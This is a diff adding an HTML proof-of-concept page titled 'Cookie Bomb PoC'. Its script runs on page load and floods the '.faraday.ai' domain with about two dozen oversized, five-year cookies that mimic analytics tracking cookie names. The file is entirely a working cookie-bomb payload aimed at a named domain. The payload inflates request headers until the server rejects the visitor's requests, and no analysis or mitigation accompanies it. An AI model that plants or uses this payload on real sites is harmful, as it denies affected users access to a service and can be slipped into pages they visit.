@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head><title>Cookie Bomb PoC</title></head>
+<body>
+<script>
+(function cookieBombTracking({
+  domain = '.faraday.ai',
+  path = '/',
+  sizeBytes = 3800,
+  copiesPerName = 1,
+  yearsToLive = 5
+} = {}) {
+  const trackingNames = [
+    '_gcl_au','_ga_N7Z9X7NSE0','_ga','__hstc','hubspotutk','_fbp','osid',
+    '_hp2_id.2716793303','_gid','_ga_G5PGNR5P2J','messagesUtk',
+    '_hp2_ses_props.2716793303','_dc_gtm_UA-50356295-1'
+  ];
+  const makeExpires = (years) => {
+    const d = new Date();
+    d.setFullYear(d.getFullYear() + years);
+    return d.toUTCString();
+  };
+  const bigValue = 'a'.repeat(sizeBytes);
+  const expires = makeExpires(yearsToLive);
+  function setCookie(name, value) {
+    document.cookie = `${name}=${value}; Expires=${expires}; Path=${path}; Domain=${domain}; SameSite=Lax`;
+  }
+  trackingNames.forEach((name) => {
+    setCookie(name, bigValue);
+    for (let i = 1; i <= copiesPerName; i++) {
+      setCookie(`${name}__pad${i}`, bigValue);
+    }
+  });
+  console.log(`[cookieBombTracking] Set ${trackingNames.length} tracking cookies (+${copiesPerName} pads each), ~${((trackingNames.length*(1+copiesPerName)*sizeBytes)/1024).toFixed(1)} KB payload.`);
+})();
+</script>
+</body>
+</html>
